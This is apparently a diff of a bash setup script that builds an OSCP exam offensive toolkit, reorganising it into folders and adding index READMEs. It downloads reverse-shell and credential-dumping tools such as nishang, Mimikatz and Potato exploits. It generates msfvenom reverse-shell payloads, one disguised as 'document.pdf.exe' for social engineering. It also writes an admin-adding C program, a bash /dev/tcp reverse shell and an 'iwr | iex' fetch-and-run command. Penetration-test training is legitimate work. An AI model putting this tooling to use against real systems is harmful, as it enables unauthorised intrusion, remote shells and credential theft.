+dl windows/creds/Get-SiteListPassword.ps1 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-SiteListPassword.ps1
 cat > attacker/decryptors/README-McAfee-SiteList.txt <<'EOF'
 Use when WinPEAS/manual review finds McAfee SiteList.xml with encrypted Password fields.
 Common paths:
@@ -1640,41 +1640,41 @@ EOF
 
 banner "WINDOWS NETWORKING / SHELLS"
 echo "[+] nc64.exe..."
-dl windows/nc64.exe https://github.com/int0x33/nc.exe/raw/master/nc64.exe
+dl windows/shells/nc64.exe https://github.com/int0x33/nc.exe/raw/master/nc64.exe
 
 echo "[+] Invoke-PowerShellTcp.ps1..."
-dl windows/Invoke-PowerShellTcp.ps1 https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+dl windows/shells/Invoke-PowerShellTcp.ps1 https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 
 # ConPtyShell: gives a fully interactive PTY on Windows (arrow keys, tab-complete,
 # Ctrl-C), which is the practical answer to "Windows shell stabilization". This is
 # more useful on the exam than a Windows socat build (of which there is no official
 # release; all are unverified third-party binaries), so socat-windows is not staged.
 echo "[+] Invoke-ConPtyShell.ps1 (interactive Windows shell upgrade)..."
-dl windows/Invoke-ConPtyShell.ps1 https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
+dl windows/shells/Invoke-ConPtyShell.ps1 https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
 
 # PsExec64.exe from the official signed Sysinternals PSTools bundle. On-target
 # lateral movement / running as SYSTEM once you have admin creds. Kali-side, prefer
 # impacket-psexec; this is the native Windows binary for use from a foothold.
 echo "[+] PsExec64.exe (official signed Sysinternals PSTools)..."
-dl_zip_match windows/PsExec64.exe https://download.sysinternals.com/files/PSTools.zip '(^|/)PsExec64\.exe$'
+dl_zip_match windows/shells/PsExec64.exe https://download.sysinternals.com/files/PSTools.zip '(^|/)PsExec64\.exe$'
 
 banner "WINDOWS PIVOTING"
 echo "[+] Chisel Windows amd64..."
-dl_zip_first windows/chisel.exe "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_windows_amd64.zip"
+dl_zip_first windows/pivot/chisel.exe "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_windows_amd64.zip"
 
 echo "[+] Chisel Windows 386..."
-dl_zip_first windows/chisel32.exe "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_windows_386.zip"
+dl_zip_first windows/pivot/chisel32.exe "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_windows_386.zip"
 
 echo "[+] Ligolo-ng agent Windows amd64..."
-dl_zip_dir windows "https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER}_windows_amd64.zip"
-for f in windows/agent.exe windows/ligolo-ng_agent*.exe; do
-    [[ -f "$f" ]] && mv -f "$f" windows/ligolo-agent.exe 2>/dev/null && break
+dl_zip_dir windows/pivot "https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER}_windows_amd64.zip"
+for f in windows/pivot/agent.exe windows/pivot/ligolo-ng_agent*.exe; do
+    [[ -f "$f" ]] && mv -f "$f" windows/pivot/ligolo-agent.exe 2>/dev/null && break
 done
 
 # UACMe is intentionally kept as source to avoid relying on unstable third-party binaries.
 echo "[+] UACMe source reference..."
 git_clone https://github.com/hfiref0x/UACME.git attacker/source/UACME
-cat > windows/README-UACME.txt <<'EOF'
+cat > windows/privesc/README-UACME.txt <<'EOF'
 UACMe is useful only when you already have local admin rights but are in a medium-integrity/restricted admin shell.
 It is not a normal low-privilege-to-admin escalation path.
 
@@ -1758,7 +1758,7 @@ done
 chmodx attacker/ligolo-proxy
 
 echo "[+] Chisel attacker copy..."
-if [[ -f linux/chisel ]]; then cp -f linux/chisel attacker/chisel || true; fi
+if [[ -f linux/pivot/chisel ]]; then cp -f linux/pivot/chisel attacker/chisel || true; fi
 chmodx attacker/chisel
 
 echo "[+] Certipy..."
@@ -1843,7 +1843,7 @@ Login:
 
 Collect AD data:
   Preferred if you have a Windows domain foothold:
-    Upload SharpHound.exe or SharpHound.ps1 from ~/privesc-toolkit/windows/SharpHound/
+    Upload SharpHound.exe or SharpHound.ps1 from ~/privesc-toolkit/windows/ad/SharpHound/
     Run collection on the domain machine
     Import the resulting ZIP into BloodHound CE with Quick Upload
 
@@ -2131,7 +2131,7 @@ Linux reverse shell:
   bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
 
 Windows encoded command helper:
-  $TOOLKIT/attacker/make-ps-enc.sh 'iwr http://$LHOST:8000/windows/Invoke-PowerShellTcp.ps1 -UseBasicParsing | iex'
+  $TOOLKIT/attacker/make-ps-enc.sh 'iwr http://$LHOST:8000/windows/shells/Invoke-PowerShellTcp.ps1 -UseBasicParsing | iex'
 EOF
 
 cat > templates/web/xxe-payloads.txt <<EOF
@@ -2353,7 +2353,7 @@ Inside debugfs:
 Copy output manually into notes. Avoid write operations unless absolutely necessary.
 EOF
 
-cat > windows/README-watchdog-service-abuse.txt <<'EOF'
+cat > windows/privesc/README-watchdog-service-abuse.txt <<'EOF'
 Use when a service, watchdog, monitor, updater, DVR/backup/agent process, or scheduled task repeatedly starts an executable and you can write to that binary or its directory.
 
 Confirm:
@@ -2427,7 +2427,7 @@ Upload rule:
   Prove a harmless marker upload first. Only try executable variants if the uploaded file is reachable or processed server-side.
 EOF
 
-cat > windows/adduser.c <<'EOF'
+cat > windows/privesc/adduser.c <<'EOF'
 #include <stdlib.h>
 int main ()
 {
@@ -2439,9 +2439,9 @@ int main ()
 EOF
 
 if have x86_64-w64-mingw32-gcc && [[ "$DRY_RUN" != "1" ]]; then
-    x86_64-w64-mingw32-gcc windows/adduser.c -o windows/adduser.exe 2>/dev/null || warn "failed to compile windows/adduser.exe"
+    x86_64-w64-mingw32-gcc windows/privesc/adduser.c -o windows/privesc/adduser.exe 2>/dev/null || warn "failed to compile windows/privesc/adduser.exe"
 else
-    warn "x86_64-w64-mingw32-gcc unavailable or dry-run; compile windows/adduser.c before exam if needed"
+    warn "x86_64-w64-mingw32-gcc unavailable or dry-run; compile windows/privesc/adduser.c before exam if needed"
 fi
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
@@ -2450,8 +2450,8 @@ fi
 
 banner "PRE-GENERATING MSFVENOM PAYLOADS"
 if have msfvenom && [[ "$LHOST" != "CHANGEME" && "$DRY_RUN" != "1" ]]; then
-    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o windows/rev64.exe 2>/dev/null || warn "failed to generate windows rev64.exe"
-    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o windows/document.pdf.exe 2>/dev/null || warn "failed to generate windows/document.pdf.exe"
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o windows/shells/rev64.exe 2>/dev/null || warn "failed to generate windows rev64.exe"
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o windows/shells/document.pdf.exe 2>/dev/null || warn "failed to generate windows/shells/document.pdf.exe"
     cat > attacker/handler_win_shell.rc <<EOF
 use exploit/multi/handler
 set PAYLOAD windows/x64/shell_reverse_tcp
@@ -2460,19 +2460,198 @@ set LPORT $LPORT
 set ExitOnSession false
 run -j
 EOF
-    msfvenom -p windows/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o windows/rev32.exe 2>/dev/null || warn "failed to generate windows rev32.exe"
-    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f dll -o windows/rev64.dll 2>/dev/null || warn "failed to generate windows rev64.dll"
-    msfvenom -p linux/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o linux/rev64.elf 2>/dev/null || warn "failed to generate linux rev64.elf"
-    msfvenom -p linux/x86/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o linux/rev32.elf 2>/dev/null || warn "failed to generate linux rev32.elf"
-    chmodx linux/rev64.elf linux/rev32.elf
+    msfvenom -p windows/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o windows/shells/rev32.exe 2>/dev/null || warn "failed to generate windows rev32.exe"
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f dll -o windows/shells/rev64.dll 2>/dev/null || warn "failed to generate windows rev64.dll"
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o linux/shells/rev64.elf 2>/dev/null || warn "failed to generate linux rev64.elf"
+    msfvenom -p linux/x86/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o linux/shells/rev32.elf 2>/dev/null || warn "failed to generate linux rev32.elf"
+    chmodx linux/shells/rev64.elf linux/shells/rev32.elf
     msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f aspx -o webshells/rev.aspx 2>/dev/null || warn "failed to generate rev.aspx"
     msfvenom -p java/jsp_shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f raw -o webshells/rev.jsp 2>/dev/null || warn "failed to generate rev.jsp"
     msfvenom -p php/reverse_php LHOST="$LHOST" LPORT="$LPORT" -f raw -o webshells/rev.php 2>/dev/null || warn "failed to generate rev.php"
     msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hta-psh -o webshells/rev.hta 2>/dev/null || warn "failed to generate rev.hta"
 else
     echo "[!] Skipping msfvenom payload generation."
-    echo "    Run later with: ./oscp-toolkit-setup-v6_4_bloodhound_docker.sh <KALI_IP> 443"
+    echo "    Run later with: ./oscp-toolkit-setup-v6.5.sh <KALI_IP> 443"
 fi
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  FOLDER INDEX FILES                                                        ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+banner "FOLDER INDEX FILES"
+
+cat > linux/enum/README.txt <<'EOF'
+LINUX ENUMERATION & PROCESS MONITORING
+Transfer these to Linux targets after getting a shell.
+
+  linpeas.sh              Primary enumeration — run first, read output slowly
+  linpeas_linux_amd64     Static binary version (no bash dependency)
+  lse.sh                  Linux Smart Enumeration — cleaner output, good second opinion
+  LinEnum.sh              Legacy fallback if others fail
+  unix-privesc-check      Old cross-check from Kali package, low priority
+  les.sh                  Kernel exploit suggester — run after manual checks
+  linux-exploit-suggester-2.pl   Perl-based kernel exploit suggester
+  pspy64 / pspy32         Watch processes without root — use when you suspect
+                          cron jobs, scripts, or background tasks running as root
+
+Start with: linpeas.sh → lse.sh → pspy if cron is suspected → les.sh only if stuck
+EOF
+
+cat > linux/shells/README.txt <<'EOF'
+LINUX STATIC BINARIES & REVERSE SHELLS
+Transfer these when the target lacks standard tools.
+
+  ncat          Static netcat — connections, listeners, file transfers
+  socat         Static socat — PTY shell upgrades, port forwarding
+  curl          Static curl — when target has no curl or wget
+  busybox       Multi-tool fallback (wget, nc, sh, and 300+ applets)
+  bash-static   Static bash — when target shell is /bin/sh or restricted
+  rev64.elf     Pre-generated x64 reverse shell (msfvenom, if LHOST was set)
+  rev32.elf     Pre-generated x86 reverse shell (msfvenom, if LHOST was set)
+EOF
+
+cat > linux/pivot/README.txt <<'EOF'
+LINUX PIVOTING AGENTS
+Transfer to a compromised host that can reach an internal network Kali cannot.
+
+  chisel         SOCKS proxy / port forwarding — use for single-port access
+  ligolo-agent   TUN-based pivot agent — preferred for full subnet access
+                 Pair with attacker/ligolo-proxy on Kali
+                 See README-FIRST section 8 for the full Ligolo workflow
+EOF
+
+cat > linux/exploits/README.txt <<'EOF'
+LINUX KERNEL & PRIVILEGE ESCALATION EXPLOITS
+Use as a LAST RESORT after checking sudo, SUID, cron, credentials, and services.
+
+  DirtyPipe (CVE-2022-0847) — kernels 5.8 through 5.16.11:
+    dirtypipe-exploit.c       Arinerron variant
+    dirtypipe-exploit-1.c     AlexisAhmed variant 1
+    dirtypipe-exploit-2.c     AlexisAhmed variant 2
+    Compiled versions are named dirtypipe-arinerron, dirtypipe-alexis1, dirtypipe-alexis2
+
+  PwnKit (CVE-2021-4034) — polkit pkexec, broad kernel range:
+    pwnkit                    Self-contained binary, just run it
+
+  CopyFail (CVE-2026-31431) — needs Python 3.10+, AF_ALG, readable SUID binary:
+    check-copyfail-prereqs.sh Run on target first to check requirements
+    fetch-copyfail-poc.sh     Kali-side: downloads and SHA256-verifies the PoC
+    copy_fail_exp.py          The verified PoC itself
+    README-COPYFAIL.txt       Full usage instructions
+
+Always confirm architecture and kernel version before attempting kernel exploits.
+EOF
+
+cat > windows/enum/README.txt <<'EOF'
+WINDOWS ENUMERATION
+Transfer these to Windows targets after getting a shell.
+
+  winPEASx64.exe          Primary enumeration — run first (x64 targets)
+  winPEASx86.exe          32-bit variant
+  winPEASany.exe          .NET AnyCPU variant
+  winPEAS.bat             Batch fallback when .exe is blocked
+  winPEAS.ps1             PowerShell fallback
+  winPEASx64_ofs.exe      Obfuscated variant if AV blocks the standard one
+  winPEASx86_ofs.exe      Obfuscated 32-bit variant
+  PrivescCheck.ps1        PowerShell-based — confirms WinPEAS findings, good detail
+                          on services, registry, credentials, scheduled tasks
+  PowerUp.ps1             Focused on service abuse — modifiable binaries, unquoted
+                          paths, weak permissions
+  Seatbelt.exe            .NET host survey — security config, interesting files
+  SharpUp.exe             .NET privesc checks (GhostPack)
+  accesschk64.exe         Sysinternals — check service/file/registry permissions
+
+Start with: winPEASx64.exe → PrivescCheck.ps1 → PowerUp.ps1 if services look promising
+EOF
+
+cat > windows/privesc/README.txt <<'EOF'
+WINDOWS PRIVILEGE ESCALATION
+Use after enumeration identifies the escalation path.
+
+  Potato tools — use when whoami /priv shows SeImpersonatePrivilege:
+    GodPotato-NET4.exe      Try first — works on modern Windows
+    GodPotato-NET35.exe     .NET 3.5 variant for older systems
+    PrintSpoofer64.exe      Alternative — uses print spooler
+    PrintSpoofer32.exe      32-bit variant
+    SigmaPotato.exe         Fallback
+    JuicyPotatoNG.exe       Fallback for older Windows
+    JuicyPotato.exe         Classic — Windows 10 1809 and earlier only
+    RoguePotato.exe         Needs a secondary host for OXID resolution
+    RogueOxidResolver.exe   Run this on the secondary host for RoguePotato
+
+  Order: GodPotato → PrintSpoofer → SigmaPotato → JuicyPotatoNG → RoguePotato
+
+  FullPowers.exe            Restore missing service account privileges BEFORE
+                            trying Potato tools — use when expected privs are absent
+  SharpEfsPotato.exe        EFS-based variant (compile from attacker/source/ if needed)
+  adduser.c / adduser.exe   Add a local admin — for writable service binary replacement
+  README-SharpEfsPotato.txt Build instructions
+  README-watchdog-service-abuse.txt  Service replacement workflow
+EOF
+
+cat > windows/creds/README.txt <<'EOF'
+WINDOWS CREDENTIAL DUMPING & DECRYPTION
+Use after getting high-integrity / admin / SYSTEM access.
+
+  Mimikatz — extract passwords, hashes, tickets from memory:
+    mimikatz-ebalo55/       Win11-compatible fork — try first
+    mimikatz-original/      Latest upstream (gentilkiwi)
+    mimikatz-stable/        Pinned 2.2.0 — known-good fallback if latest misbehaves
+
+  LaZagne.exe               Recover passwords from browsers, mail, databases, sysadmin
+                            tools, wifi — run as admin for full results
+  RunasCs/                  Run commands as another user with known credentials —
+                            useful when you have creds but no interactive logon
+  Get-SiteListPassword.ps1  Decrypt McAfee SiteList.xml encrypted passwords —
+                            see attacker/decryptors/README-McAfee-SiteList.txt
+
+Mimikatz basic flow:
+  mimikatz.exe → privilege::debug → sekurlsa::logonpasswords
+EOF
+
+cat > windows/ad/README.txt <<'EOF'
+WINDOWS ACTIVE DIRECTORY
+Use on domain-joined machines for AD enumeration and lateral movement.
+
+  Rubeus.exe            Kerberos attacks — Kerberoast, AS-REP roast, delegation,
+                        ticket requests, pass-the-ticket
+  Certify.exe           AD Certificate Services — find misconfigured templates
+  SharpHound/           BloodHound data collector — run with: SharpHound.exe -c All
+                        Upload the ZIP to BloodHound CE on Kali
+  PowerView.ps1         AD recon — users, groups, ACLs, shares, trusts, sessions
+  PowerUpSQL.ps1        SQL Server discovery and privilege escalation in AD
+  SharpCollection/      Nightly-built .NET binaries across runtimes — use when you
+                        need a specific .NET version build of any GhostPack tool
+
+Typical flow:
+  SharpHound → BloodHound (find paths) → Rubeus/Certify (exploit path) → PowerView (recon)
+EOF
+
+cat > windows/shells/README.txt <<'EOF'
+WINDOWS REMOTE SHELLS & LATERAL MOVEMENT
+Transfer these for shell access and stabilization.
+
+  nc64.exe                    Netcat for Windows — reverse shells, listeners, transfers
+  Invoke-PowerShellTcp.ps1    PowerShell reverse shell (nishang) — basic callback
+  Invoke-ConPtyShell.ps1      Fully interactive PTY — arrow keys, tab-complete, Ctrl-C
+                              Use this for shell stabilization on Windows
+  PsExec64.exe                Sysinternals — run commands as SYSTEM, lateral movement
+                              with admin creds (prefer impacket-psexec from Kali)
+  rev64.exe / rev32.exe       Pre-generated reverse shells (msfvenom, if LHOST was set)
+  rev64.dll                   DLL reverse shell — for DLL hijack / sideloading attacks
+  document.pdf.exe            Disguised reverse shell — for social-engineering scenarios
+EOF
+
+cat > windows/pivot/README.txt <<'EOF'
+WINDOWS PIVOTING AGENTS
+Transfer to a compromised Windows host to reach internal networks.
+
+  chisel.exe      SOCKS proxy / port forwarding (x64)
+  chisel32.exe    32-bit variant
+  ligolo-agent.exe  TUN-based pivot agent — preferred for full subnet access
+                    Pair with attacker/ligolo-proxy on Kali
+                    See README-FIRST section 8 for the full Ligolo workflow
+EOF
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
 # ║  SUMMARY / VERIFICATION                                                    ║
@@ -2503,11 +2682,11 @@ echo "Quick serve from toolkit root:"
 echo "  cd $TOOLKIT && python3 -m http.server 8000"
 echo ""
 echo "Linux target example:"
-echo "  cd /tmp && wget http://<KALI_IP>:8000/linux/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh"
+echo "  cd /tmp && wget http://<KALI_IP>:8000/linux/enum/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh"
 echo ""
 echo "Windows target example:"
 echo "  mkdir C:\\temp & cd C:\\temp"
-echo "  certutil -urlcache -f http://<KALI_IP>:8000/windows/winPEASx64.exe winPEASx64.exe"
+echo "  certutil -urlcache -f http://<KALI_IP>:8000/windows/enum/winPEASx64.exe winPEASx64.exe"
 echo ""
 echo "Review files:"
 echo "  $TOOLKIT/MANIFEST.sha256"
